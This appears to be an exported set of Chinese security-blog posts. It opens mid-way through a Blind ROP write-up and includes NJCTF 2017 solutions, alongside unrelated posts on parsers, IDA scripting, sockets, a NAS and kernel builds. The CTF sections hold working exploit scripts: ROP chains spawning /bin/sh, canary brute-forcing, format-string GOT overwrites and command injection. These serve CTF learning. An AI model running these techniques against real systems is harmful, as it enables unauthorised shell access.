password?') p.sendline(payload) try: #for junk p.recvline() if(p.recv() != None): log.info(&quot;alive ! at 0x%x&quot; % addr) log_in_file(addr) p.close() except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr)#finally,I got hang_addr = 0x400724 2. 找到gadgets有了hang addr，下一步就是寻找gadgets了，我这里是直接找通用型gadgets。我放置的payload如下: 1payload = &quot;A&quot; * 72 + p64(addr) + p64(1)+p64(2)+p64(3)+p64(4)+p64(5)+p64(6)+p64(hang_addr) 如果说，程序不挂那就说明找到了这个gadgets 。 1234567pop rbxpop rbppop r12pop r13pop r14pop r15ret 代码如下： 123456789101112131415def get_gadgets_addr(addr): p = remote('127.0.0.1',10001) payload = &quot;A&quot; * 72 + p64(addr) + p64(1)+p64(2)+p64(3)+p64(4)+p64(5)+p64(6)+p64(hang_addr) p.recvuntil('WelCome my friend,Do you know password?') p.sendline(payload) try: #for junk p.recvline() if(p.recv() != None): log.info(&quot;find gadgets at 0x%x&quot; % addr) log_in_file(addr) p.close() except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr) 最后我得到的结果是： 12345678910111213141516171819202122ppppppr_addr = 0x4007bagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addr'''gadget1: mov rdx,r13 mov rsi,r14 mov edi,r15d call QWORD PTR [r12+rbx*8] add rbx,0x1 cmp rbx,rbp jne 4007a0 &lt;__libc_csu_init+0x40&gt; add rsp,0x8gadget2: pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 ret''' 3. 构造leak去dump bin file通用型gadgets的构造我这里使用了Icemakr写好的一个函数 123456789101112#this func from Icemakr. thx.def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0): payload = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret payload += p64(0x0) # rbx be 0x0 payload += p64(0x1) # rbp be 0x1 payload += p64(jmp2) # r12 jump to payload += p64(arg3) # r13 -&gt; rdx arg3 payload += p64(arg2) # r14 -&gt; rsi arg2 payload += p64(arg1) # r15 -&gt; edi arg1 payload += p64(part2) # part2 entry will call [rbx + r12 + 0x8] payload += 'A' * 56 # junk return payload 后面直接构造leak函数 1234567891011121314151617181920212223242526272829def leak(addr): p = remote('127.0.0.1',10001) #p = process('./main') #raw_input('#') payload = &quot;A&quot;*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr) p.recvuntil('WelCome my friend,Do you know password?') p.sendline(payload) try: p.recvline() data = p.recvline().strip() if(data != None): try: data = data[0:data.index(&quot;WelCome&quot;)] except ValueError as e: data = data #if leak data is 0x00 if data == &quot;&quot;: data = &quot;\\x00&quot; #if leak data is end with 0x0a elif(data[len(data)- 1] == '\\n' and data[len(data)- 2] == '\\n'): data = data.strip() data = data+&quot;\\x0a&quot; log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr,(data or '').encode('hex'))) p.close() return data except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr) return None 其实只要分别从0x400000和0x600000开始dump就可以。 4.getshell有了dump之后就得到了got表的信息，下面就可以正常的做了，leak函数地址，查偏移，然后构造rop，然后getshell。 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.log_level = 'debug'context.arch='amd64'def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0): payload = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret payload += p64(0x0) # rbx be 0x0 payload += p64(0x1) # rbp be 0x1 payload += p64(jmp2) # r12 jump to payload += p64(arg3) # r13 -&gt; rdx arg3 payload += p64(arg2) # r14 -&gt; rsi arg2 payload += p64(arg1) # r15 -&gt; edi arg1 payload += p64(part2) # part2 entry will call [rbx + r12 + 0x8] payload += 'A' * 56 # junk return payloadhang_addr = 0x400724ppppppr_addr = 0x4007bagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1aputs_got = 0x601018pop_rdi = gadget1 + (0x400E72 - 0x400E6A + 1)p = remote('127.0.0.1',10001)payload = 'A' * 72payload += com_gadget(gadget1,gadget2,puts_got,arg1=0,arg2=puts_got)+p64(hang_addr)payload += p64(hang_addr)p.send(payload)content = p.recv()puts_addr = u64(content[:-1] + '\\x00\\x00')offset_system = 0x45390offset_str_bin_sh = 0x18c177system_addr = puts_addr - (0x6f690 - offset_system)bin_sh_addr = puts_addr - (0x6f690 - offset_str_bin_sh)payload = 'A' * 72payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)p.send(payload)p.interactive() 0x03: 参考与引用BROPIcemakr师傅的git","link":"/2017/01/22/Have-fun-with-Blind-ROP/"},{"title":"LL LR SLR LALR傻傻分不清","text":"撸公开课的时候被这几个文法绕晕了。搜了很多东西，合并整理方便后续查看。 0x01: 概念 首先，LL文法是自顶向下，用的是推导；LR、SLR、LALR是自底向上，用的是规约。 1. LL(1)第一个L代表从左向右扫描输入符号串，第二个L代表产生最左推导，1代表在分析过程中执行每一步推导都要向前查看一个输入符号——当前正在处理的输入符号。龙书上的判断规则是： 123形如 A-&gt;a|β 这样的文法，满 足 ①FIRST(α)∩ FIRST (β ) =Φ ②若ε∈ FIRST( α)， 要满足 FIRST(β) ∩FOLLOW(A)=Φ 2. LR(0)如果某一文法能够构造一张分析表，使得表中每一个元素至多只有一种明确动作，则该文法称为LR文法。 具体来说： 1231、构造它的LR(0)项目集合的DFA（即识别该文法全部活前缀的DFA）；2、根据该DFA画出该文法的LR(0)分析表；3、在分析表中，每格要么只有一个内容，要么没有内容，（即无冲突）则为LR(0)文法。 概括一下就是：见到First集就移进，见到终态就归约 3. SLR(1)满足下面两个条件的文法是SLR(1)文法 123a.对于在s中的任何项目 A→α.Xβ,当X是一个终结符，且X在Follow(B)中时，s中没有完整的项目B→r.b.对于在s中的任何两个完整项目A→α.和 B→β.,Follow(A)∩Follow(B)为空。 概括就是：见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。 4. LALR(1)LALR即“Look-Ahead LR”。其中，Look-Ahead为“向前看”，L代表对输入进行从左到右的检查，R代表反向构造出最右推导序列。 5. LR(1)和LR(0)一致，只是构造自动机的时候多向前查看一个字符。 0x02: 关系与对比1. SLR(1)与LR(0)的关系：SLR(1)与LR(0)：简单的LR语法分析技术（即SLR（1）分析技术）的中心思想是根据文法构造出LR（0）自动机。 LR(0):见到First集就移进，见到终态就归约 SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。 2. LR(1)与LR(0)的关系：规范LR（1）语法分析技术的中心思想是根据文法构造出LR（1）自动机 ，而规范LR（1）自动机构造方法和LR（0）自动机的构造方法相同，只是多增加了向前搜索符号。 3. 规范LR(1)与LALR(1)的关系：LALR(1)是对LR(1)项集族I中具有同心项的项集进行合并得到I’，然后根据I’进行分析的方法。 4. 各种文法能力的对比 0x03: 引用LL LR SLR LALR 傻傻分不清 编译原理:LL(1),LR(0),SLR(1),LALR(1),LR(1)对比 如何判断文法是LL(1)SLR(1)LR(1)LALR(1)的？ 维基百科","link":"/2018/02/11/LL-LR-SLR-LALR%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/"},{"title":"IDA自动化分析","text":"0x00 : 需求​ 最近有一些自动化分析bin中调用路径的需求，在查询了一些资料后，组合了一些现有方案，最终完成了自己的这个小工具。 ​ 具体需求： - 自动分析，后台跑 - 分析给定的函数调用路径 0x01 : codepython模版12345idc.Wait() # 等待分析完.... # 分析工作idc.Exit(0) # 完成后自动退出 运行1&quot;/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64&quot; -c -A -S&quot;scan.py&quot; bin 分析调用路径这部分直接用了利用IDA Python静态分析函数调用路径里的代码 123456789101112131415161718192021222324252627282930313233343536373839404142def gen_r_call_chain(func_name, osintneting): del r_call_chain[:] f_r_call_out = open('call_{0}_{1}.csv'.format(cur_bin_filename, func_name), 'w') get_my_caller(func_name, osintneting, f_r_call_out) f_r_call_out.close()def get_my_caller(func_name, osintneting, fl): if ida_kernwin.user_cancelled(): print('Cancelled') fl.close() exit() str = '{0}\\t'.format(func_name) r_call_chain.append(str) addr = get_name_ea(0, func_name) addr_ref_to = get_first_fcref_to(addr) osinteneting_end = False if addr_ref_to == BADADDR: osinteneting_end = True elif osintneting == -1: osinteneting_end = False elif osintneting == 1: osinteneting_end = True if osinteneting_end is True: length = len(r_call_chain) for idx in range(length): fl.write(r_call_chain[length - idx - 1]) sys.stdout.write(r_call_chain[length - idx - 1]) fl.write(&quot;\\n&quot;) sys.stdout.write('\\r\\n') r_call_chain.pop() return while (addr_ref_to != BADADDR) and (addr_ref_to != addr): parent_func_name = get_func_name(addr_ref_to) get_my_caller(parent_func_name, osintneting - 1, fl) addr_ref_to = get_next_fcref_to(addr, addr_ref_to) if addr_ref_to == BADADDR: r_call_chain.pop() break ##0x03 : reference 命令行调用 idapython 脚本 利用IDA Python静态分析函数调用路径","link":"/2019/07/09/IDA%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/"},{"title":"Hello World升级版","text":"0x00:偶然在知乎上看到一个问题，特殊的方式输出hello world，后来知道这是cnss的招新题目，感觉还挺有意思的，做了下记录下来。 题目要求 12341.不用 “ ” 输出Hello World2.不用 ; 输出Hello World3.不用# 输出Hello World4.不用括号输出Hello World (包括各种括号()，&lt;&gt;，｛｝，［］都不能用 ) 0x01: level 11234567891011121314151617181920$ cat test.c#include &lt;stdio.h&gt;int main(void){ putchar(72); putchar(101); putchar(108); putchar(108); putchar(111); putchar(32); putchar(119); putchar(111); putchar(114); putchar(108); putchar(100); putchar(10); return 0;} 123# muhe @ muheMacBookPro in /tmp [18:10:11]$ ./testHello world 0x02: level 212345678910111213141516$ cat test.cint main(void){ if(putchar(72)) {} if(putchar(101)) {} if(putchar(108)) {} if(putchar(108)) {} if(putchar(111)) {} if(putchar(32)) {} if(putchar(119)) {} if(putchar(114)) {} if(putchar(108)) {} if(putchar(100)) {} if(putchar(10)) {}} 1234567891011# muhe @ muheMacBookPro in /tmp [18:15:10]$ clang test.c -o testtest.c:3:8: warning: implicit declaration of function 'putchar' is invalid in C99 [-Wimplicit-function-declaration] if(putchar(72)) {} ^1 warning generated.# muhe @ muheMacBookPro in /tmp [18:15:15]$ ./testHello wrld 0x03: level 3主要是#符号的替代。 12345678910111213141516$ cat test.c%:include &lt;stdio.h&gt;int main(void){ if(putchar(72)) {} if(putchar(101)) {} if(putchar(108)) {} if(putchar(108)) {} if(putchar(111)) {} if(putchar(32)) {} if(putchar(119)) {} if(putchar(114)) {} if(putchar(108)) {} if(putchar(100)) {} if(putchar(10)) {}} 123456# muhe @ muheMacBookPro in /tmp [18:18:03]$ clang test.c -o test# muhe @ muheMacBookPro in /tmp [18:18:05]$ ./testHello wrld 0x04: level 4这个好难想…shellcode行么我想说…msfvenom直接生成一个…那么问题来了，sc也要执行啊，咋规避括号，难道要手写一个PE/ELF文件么。 0x05: 结语挺有意思的问题，这个东西仁者见仁，智者见智，知乎上见到太多方式了，毕竟putchar很丑陋，轮子哥那个代码还是挺好看的。至于level 4，有人提到了hack c，很可惜UB…","link":"/2017/10/01/Hello-World%E5%8D%87%E7%BA%A7%E7%89%88/"},{"title":"Linux Kernel Exploit 4 beginners","text":"0x00:Linux Kernel Exploit 的入门系列，开始像无头苍蝇似的瞎撞，找资料学习，后来joker师傅指了明路，才走上正轨。 遂记录三篇，文章均已发布在安全客，博客就只丢出链接。 0x01: 文章链接【系列分享】Linux 内核漏洞利用教程（一）：环境配置 【系列分享】Linux 内核漏洞利用教程（二）：两个Demo 【系列分享】Linux 内核漏洞利用教程（三)： 实战CSAW CTF题目 0x02 : 一点想法还是师傅的话说得好：分享精神，让更多的人可以一起学习。 QAQ","link":"/2017/04/06/Linux-Kernel-Exploit-4-beginners/"},{"title":"Linux socket进程间通信及应用","text":"0x00linux socket网络编程大家肯定不会陌生，然而linux也可以使用socket这套接口来实现进程间通信，大概的步骤和网络通信差不多，也是可以基于C/S的，服务端创建套接字，然后绑定、侦听，客户端创建套接字，链接，然后就可以通信了。这篇文章主要是关于基本使用以及一点应用，仅仅是个人看法。 0x01 基础部分1.socket创建首先来看socket的创建，依然是使用socket()函数，不过第一个参数，即类型变了，具体函数如下 1234567#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt; .... .... unix_socket = socket(AF_UNIX, type, 0); .... .... AF_UNIX也可以替换成AF_LOCAL 2.socket命名关于socket进程通信，命名方式有两种，一是普通命名，二是抽象命名空间。差别在于，普通命名会根据你给的名字产生一个socket文件，然后你的通信过程socket会读取这个文件，这种方式也就决定了你编写的server必须对这个命名文件的路径有读写权限，而且客户端必须知道这个文件的路径；然而抽象命名空间的方式没有这个限制，但是需要一个全局名称，客户端根据这名称来连接。 1.普通命名 1234567#define SERVER_NAME &quot;/tmp/server_socket&quot;server_addr.sun_family = AF_UNIX;strcpy(server_addr.sun_path,SERVER_NAME);server_len = sizeof(struct sockaddr_un);client_len = server_len; 服务端必须对/tmp/server_socket有读写权限，且客户端知道这个路径。 2.抽象命名空间 123456#define SERVER_NAME &quot;@server_socket&quot;server_addr.sun_family = AF_UNIX; strcpy(server_addr.sun_path, SERVER_NAME); server_addr.sun_path[0]=0;server_len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); 这种方式对地址结构成员sun_path数组赋值的时候，必须把第一个字节置0。 2.socket绑定这个是对于服务端来说的，也是使用bind函数 12345 .... ....bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len); .... .... 2.socket侦听使用listen函数 12345 .... ....listen(server_sockfd, 5); .... .... 2.socket连接下面这个部分，作为服务端，要等待服务端的连接，使用accept函数接收连接然后做处理，作为服务端使用connect函数连接，然后通信。 12345678910111213while(1){ //accept client connect client_len = sizeof(client_addr); client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len); //每次读一个字节并显示 read(client_sockfd, &amp;ch, 1); printf(&quot;read from client %d: %c&quot;,client_sockfd,ch); ch ++; write(client_sockfd, &amp;ch, 1); //关闭连接 close(client_sockfd);} 1234567891011//communicate with server socket while(1){ printf(&quot;set send content:&quot;); //从键盘读取一个自己发送给服务端 scanf(&quot;%c&quot;,&amp;ch); write(sockfd, &amp;ch, 1); printf(&quot;send to server:%c \\n&quot;,ch); read(sockfd, &amp;ch, 1); printf(&quot;read from server: %c\\n&quot;, ch); } 0x02 示例代码这里直接使用了参考blog中的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//server.c#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/un.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#define SERVER_NAME &quot;@server_socket&quot;//#define SERVER_NAME &quot;/tmp/server_socket&quot;int main(){ int server_sockfd, client_sockfd; socklen_t server_len, client_len; struct sockaddr_un server_addr; struct sockaddr_un client_addr; char ch; int nread; //delete the old server socket unlink(&quot;server_socket&quot;); server_sockfd = socket(AF_UNIX, SOCK_STREAM, 0); server_addr.sun_family = AF_UNIX; strcpy(server_addr.sun_path, SERVER_NAME); server_addr.sun_path[0]=0;//普通命名不应该有这句 server_len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len); //listen the server listen(server_sockfd, 5); client_sockfd = -1; client_len = sizeof(client_addr); while(1){ printf(&quot;server waiting...\\n&quot;); if(client_sockfd == -1){ client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len); } nread = read(client_sockfd, &amp;ch, 1); if(nread == 0){ printf(&quot;client %d disconnected\\n&quot;,client_sockfd); client_sockfd = -1; } else{ printf(&quot;read from client %d: %c\\n&quot;,client_sockfd,ch); ch ++; write(client_sockfd, &amp;ch, 1); } usleep(100); } return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//client.c#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/un.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#define SERVER_NAME &quot;@server_socket&quot;//#define SERVER_NAME &quot;/tmp/server_socket&quot;int main(){ int sockfd; socklen_t len; struct sockaddr_un address; int result; char ch = 'A'; //create socket sockfd = socket(AF_UNIX, SOCK_STREAM, 0); address.sun_family = AF_UNIX; strcpy(address.sun_path, SERVER_NAME); address.sun_path[0]=0; len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); result = connect(sockfd, (struct sockaddr*)&amp;address, len); if(result == -1) { perror(&quot;opps:client1&quot;); exit(1); } //communicate with server socket while(1) { printf(&quot;set send content:&quot;); scanf(&quot;%c&quot;,&amp;ch); write(sockfd, &amp;ch, 1); printf(&quot;send to server:%c \\n&quot;,ch); read(sockfd, &amp;ch, 1); printf(&quot;read from server: %c\\n&quot;, ch); } exit(0);} 效果如下 1234567891011121314$ ./server server waiting...read from client 4: aserver waiting...read from client 4: server waiting...read from client 4: Zserver waiting...read from client 4: server waiting... 12345678910111213141516$ ./client set send content:asend to server:a read from server: bset send content:send to server: read from server: set send content:Zsend to server:Z read from server: [set send content:send to server: read from server: set send content: 服务端把客户端发来的字符加一后送回了。 0x03 关于应用既然是进程间的通信，那么父子进程之间通信也是可以使用这个东西的。 那这个东西就可以用来做一个wapper，赛棍们都懂的 2333333 或者可以用来做简单的fuzz，子进程里启动目标程序，然后交互数据都是通过socket传递，那么就可以把一些输入变异之后再送过去吧，而且异常捕获也挺好做，waitpid就可以。不过用来做fuzzer的话，效率不知道怎么样… 0x04 代码首先创建套接字，然后fork产生子进程 123456789int pid;unlink(SOCK_NAME);int s = socket(AF_UNIX, SOCK_STREAM, 0);struct sockaddr_un addr;memcpy(addr.sun_path, SOCK_PATH, strlen(SOCK_PATH));addr.sun_family = AF_UNIX;bind(s, (struct sockaddr *)&amp;addr, strlen(addr.sun_path) + sizeof(addr.sun_family));listen(s, 5);pid = fork(); 父进程与子进程启动的目标程序交互，可以劫持输入输出。 1234567891011121314151617181920212223struct sockaddr_un child;int clen = sizeof(child);int cs = accept(s, (struct sockaddr *) &amp;child, &amp;clen);if (cs == -1) { fprintf(stderr, &quot;server socket fail\\n&quot;); exit(0);}n = read(cs, buf, BUFSIZE);write(1, buf, n);while (1) { // 在这里可以劫持输入 n = read(0, buf, BUFSIZE); write(cs, buf, n); bzero(buf, BUFSIZE); // 劫持输出 n = read(cs, buf, BUFSIZE); write(1, buf, n);} 子进程里启动目标程序 12345678910111213int s = socket(AF_UNIX, SOCK_STREAM, 0);struct sockaddr_un addr;bzero(addr.sun_path, sizeof(addr.sun_path));memcpy(addr.sun_path, SOCK_PATH, strlen(SOCK_PATH));addr.sun_family = AF_UNIX;connect(s, (struct sockaddr *)&amp;addr, strlen(addr.sun_path) + sizeof(addr.sun_family));if (s == -1) { fprintf(stderr, &quot;cli socket fail\\n&quot;); exit(0);}dup2(s, 0);dup2(s, 1);execve(&quot;./target&quot;, NULL, NULL); 0x05 参考manpagelinux socket进程间通信","link":"/2017/01/30/Linux%20socket%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8F%8A%E5%BA%94%E7%94%A8/"},{"title":"NAS折腾记录","text":"关于 大概五月的时候丢失了一波数据，大概不到2TB，虽然最后救回来了一部分，但是仍然让我心有余悸，生怕这样的情况再次发生，索性申请资金买NAS，由于本身又不折腾硬件什么的，就直接一步到位选择了群晖DS218+，双盘位，x86，够折腾了。 因为是两盘位，所以尽量硬盘选择的大一点，不然后续置换很麻烦，而且为了保证数据安全肯定是要做raid的，我这里直接买了两块希捷的8T企业盘，肉疼是肯定的，但是换来的是大容量+安全性，所以还是物有所值；最后还给NAS加了一条内存，方便后面折腾docker。 套件&amp;&amp;Docker 我本身使用NAS就是为了数据备份，所以群晖提供的套件还是十分实用，有种买软件送NAS的感觉，手机相册直接使用Monments备份了，mac可以tm备份上去，不过我还是专门准备了一块2t的移动硬盘给mac做tm备份，重要的文件会选择多处备份，直接用了群晖的Synology Drive给同步到了NAS上，当然这些都比较简单基础。 为了随时能连上nas使用，群晖虽然提供了quick connect，但是涉及到NAS上跑着的一些docker的时候，这样就很不方便了；所以我找联通开了公网ip，然后NAS设置里开了DDNS，然后可以用群晖提供的域名直接来访问自己的NAS了，不过为了安全起见，我开了一些安全策略以及ban掉了非必须端口，并且开了SSL。 在有公网ip的情况下，就可以开始造作了，我折腾的比较多的是docker： gitea snell docker(for proxy) Aria2 Ubuntu &amp;&amp; mongodb 为了不暴露太多端口出来（gitea的，ubuntu的啥的），我的设想是只暴露一个代理的端口，然后我连上代理，其他的容器通过代理本地访问，这样能最大限度减少风险，代理的话也不选用常用的，或者说自己做一些修改。 自己搞个git用真舒服啊，gitlab太重了，个人使用的话没必要，gitea比较轻量级，真香。 总之这还是蛮香的，配置好aria2后，下电影再结合群晖的Video Station 家庭影院分分钟搞起，还能随时随地学习，真香 😄","link":"/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"},{"title":"NJCTF-2017部分wp","text":"0x00:只做了几个很水的题目…我好菜啊 0x01:re300找到了原题…直接用脚本解的 123456789101112131415161718from itertools import cycleimport subprocessdef xor(s1, s2, enc_add): return ''.join(chr(ord(a) ^ ord(b) ^ enc_add) for a,b in zip(cycle(s1), s2))keys = [str(x)*3 for x in range(1, 500)]# pull the encoded stuff out of the program's outputout, _ = subprocess.Popen(['./re300'], stdout=subprocess.PIPE).communicate()hex_enc = out.split('\\n')[0].split()[-1]enc = hex_enc.decode('hex')for key in keys: enc_add = len(enc) &amp; 0xFF; enc = xor(key, enc, enc_add)print enc 得到NJCTF{2c3010644150e03b6630a0b3b7f8607b} 0x02:vsvs脑洞…数字22是爆破来的，然后就不知道干啥了，瞎脑洞发现可以足够长的buffer之后的字符串会被当成命令执行(name那里) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#context.log_level = 'debug'#context.arch=''def login(p,code): p.recvuntil('code:') p.sendline(str(code))def handle(p,input,name): p.recvuntil('input:') p.sendline(str(input)) p.recvuntil('name?') p.sendline(str(name))def main(): length = 1024 ''' while True: p = remote('218.2.197.235',23749) login(p,22) payload = &quot;a&quot; * length + 'ls' handle(p,'muhe',payload) length += 1 p.close() ''' p = remote('218.2.197.235',23749) login(p,22) payload = &quot;a&quot; * length + 'cat&lt;flag' handle(p,'muhe',payload) print p.recvline()if __name__ == '__main__': main() 0x03:pwn200栈溢出简单粗暴，不过需要暴力猜解canary，然后直接ret到send flag的函数那里，把flag读回来。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = 'debug'context.arch = 'amd64'LOCAL = False'''if LOCAL: p = process('filename')else: p = remote('127.0.0.1',5555)'''def crack_canary(): canary = &quot;\\x00&quot; while True: if len(canary) == 8: break for item in range(0xff): canary_tmp = canary + chr(item) try: r = remote('218.2.197.234', 2090) #r = remote('127.0.0.1',5555) r.recvuntil(&quot;Welcome!\\n&quot;) payload = &quot;A&quot;*(0x70-8) payload += canary_tmp r.send(payload) data = r.recv(100,timeout=1) if &quot;Message received!&quot; in data: canary += chr(item) log.info(&quot;get:{0}&quot;.format(hex(item))) break r.close() except: continue #raw_input(&quot;now,stop&quot;) log.info(&quot;[*] canary:{0}&quot;.format(hex(u64(canary)))) return canarydef main(): #canary_local = 0x977e4ba376461900 canary = 0x9dccf42e364dcf00 payload = &quot;a&quot; *(0x70-0x8) + p64(canary) + &quot;aaaaaaaa&quot;+p64(0x0000000000400BC6) r = remote('218.2.197.234', 2090) r.recvuntil(&quot;Welcome!\\n&quot;) r.send(payload) print r.recvline(1024,timeout=0.5) r.close()if __name__ == '__main__': main() 0x04 : pwn300(未做出)无bin文件的格式化字符串，探测之后发现时x86的程序。首先dump file吧，然后leak got，查libc，确定system，直接改了printf的got去get shell。比赛的时候offset一直查不到…就gg了，后来joker师傅的libc库贼全，给了我offset。(我一定好好收集libc…) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level = 'debug'context.arch = 'i386'LOCAL = Falseif LOCAL: p = process('filename')else: p = remote('218.2.197.235',23745) #p = remote('127.0.0.1',10001)setbuf_got = 0x08049970printf_got = 0x08049974puts_got = 0x08049980fgets_got = 0x08049978strchar_got= 0x08049984def info_leak(addr,length=0): payload = &quot;BBBB&quot; + &quot;%9$s&quot; + p32(addr) + &quot;AAAA&quot; p.sendline(payload) p.recvuntil('BBBB') data = u32(p.recv(4)) return datadef exp(offset): p.recvuntil('me') #fucking info leak work... data = info_leak(setbuf_got) log.info(&quot;puts:{0}&quot;.format(hex(data))) data = info_leak(fgets_got) log.info(&quot;setbuf:{0}&quot;.format(hex(data))) data = info_leak(fgets_got) log.info(&quot;fgets:{0}&quot;.format(hex(data))) data = info_leak(strchar_got) log.info(&quot;strchr:{0}&quot;.format(hex(data))) #printf_got = 0x08049974 #local data = info_leak(printf_got) log.info(&quot;printf:{0}&quot;.format(hex(data))) #local_offset = 59600 system_addr = data - offset log.info(&quot;system:{0}&quot;.format(hex(system_addr))) write = system_addr &amp; 0xffffff two = write&amp;0xffff one = (write&gt;&gt;16)&amp;0xff payload = p32(printf_got+2) payload += p32(printf_got) payload += &quot;%{0}c%7$hhn%{1}c%8$hn&quot;.format(one-8,two-one) p.sendline(payload) p.sendline(&quot;/bin/sh&quot;) p.interactive()def main(): remote_offset = 0xe6e0 exp(remote_offset)if __name__ == '__main__': main() 0x05: mobile100-safebox暴力跑testAndroid里的check逻辑，可以得到两组解，只有一组符合要求。 123456789101112131415161718192021222324252627282930313233343536373839package com.muhe;import javafx.beans.property.IntegerProperty;import java.util.ArrayList;public class Main { public static void main(String[] args) { String flag = &quot;NJCTF{have&quot;; int num1 = 48533584; System.out.println(flag + (((char)(num1 / 1000000))) + (((char)(num1 / 10000 % 100))) + (((char)(num1 / 100 % 100+10))) + &quot;f4n}&quot;); num1 = 48539584; System.out.println(flag + (((char) (num1 / 1000000))) + (((char) (num1 / 10000 % 100))) + (((char) (num1 / 100 % 100 + 10))) + &quot;f4n}&quot;); Crack ck = new Crack(); ArrayList list = new ArrayList(); int num = 10000000; while (true){ if(num&gt;99999999){ break; } boolean ret = ck.crack(num); if(ret){ list.add(num); } num += 1; } System.out.println(&quot;Done&quot;); for(int i = 0;i&lt;list.size();i++){ System.out.println(list.get(i)); } }} 123456789101112131415161718192021222324252627282930313233343536package com.muhe;/** * Created by muhe on 2017/3/11. */public class Crack { public boolean crack(int v4) { int v11 = 3; if(v4 &gt; 10000000 &amp;&amp; v4 &lt; 99999999) { int v7 = 1; int v8 = 10000000; int v3 = 1; if(Math.abs(v4 / 1000 % 100 - 36) == v11 &amp;&amp; v4 % 1000 % 584 == 0) { int v5 = 0; while(v5 &lt; v11) { if(v4 / v7 % 10 != v4 / v8 % 10) { v3 = 0; } else { v7 *= 10; v8 /= 10; ++v5; continue; } break; } if(v3 != 1) { return false; } return true; } } return false; }} 得到结果 12345NJCTF{have05-f4n}NJCTF{have05if4n} //这个就是flagDone4853358448539584","link":"/2017/03/15/NJCTF-2017%E9%83%A8%E5%88%86wp/"},{"title":"Linux Kernel 编译踩坑","text":"env configubuntu 18.04 amd64 gcc-8works on ubuntu 16.04 and 18.04 1234sudo add-apt-repository ppa:ubuntu-toolchain-r/testsudo apt-get updatesudo apt-get install gcc-8 g++-8gcc-8 --version clang123456789R=348261svn co -r $R http://llvm.org/svn/llvm-project/llvm/trunk llvmcd llvm(cd tools &amp;&amp; svn co -r $R http://llvm.org/svn/llvm-project/cfe/trunk clang)(cd projects &amp;&amp; svn co -r $R http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)mkdir llvm_cmake_build &amp;&amp; cd llvm_cmake_buildcmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../make -j64 clangexport KMSAN_CLANG_PATH=`pwd`/bin/clang 文档里-j64真的奢华… qemu kvm这部分推荐手动编译最新版本/较新版本，直接apt安装的版本有点老，后面可能有影响。 基本没啥坑，就是耗时耗力 :( build kernelmainline123make menuconfigcp path/to/config .configmake bzImage -j2 linux-next一样的编译过程，next只是代码比较激进的版本 123make menuconfigcp path/to/config .configmake bzImage -j2 kmsan跟着readme走就行了 遇到一个坑点， 123export KMSAN_CLANG_PATH=`pwd`/bin/clang...make CC=$KMSAN_CLANG_PATH -j64 -k 2&gt;&amp;1 | tee build.log 直接这么编译有问题，试了几次都不行，提示说编译器不支持xxxx这类问题。最后我尝试了: 1export CC=/path/to/clang 之后直接编译就没问题了 1make bzImage -j2 这个版本我后面弄了个更新版本的clang也可以直接编译过。 ktsan编译没啥坑，就是注意.config文件别乱改。 1234567git clone https://github.com/google/ktsan.gitcd ktsan/make defconfigmake kvmconfigscripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFOyes '' | make oldconfigmake -j2 LOCALVERSION=-tsan run kernel创建文件系统 123456789IMG=qemu-image.imgDIR=mount-point.dirqemu-img create $IMG 10gmkfs.ext2 $IMGmkdir $DIRsudo mount -o loop $IMG $DIRsudo debootstrap --arch amd64 jessie $DIRsudo umount $DIRrmdir $DIR 这样直接创建不行，需要在取消挂载之前设置好新文件系统里的用户名密码。 1sudo chroot mount-point.dir /bin/bash 进去之后，直接修改root密码就行了 1# passwd root 其实还能做其他的设置，但是只是为了验证加载的内核是否正常，只需要登录进去就ok了。 基本上都能用这个命令起来 1234567sudo qemu-system-x86_64 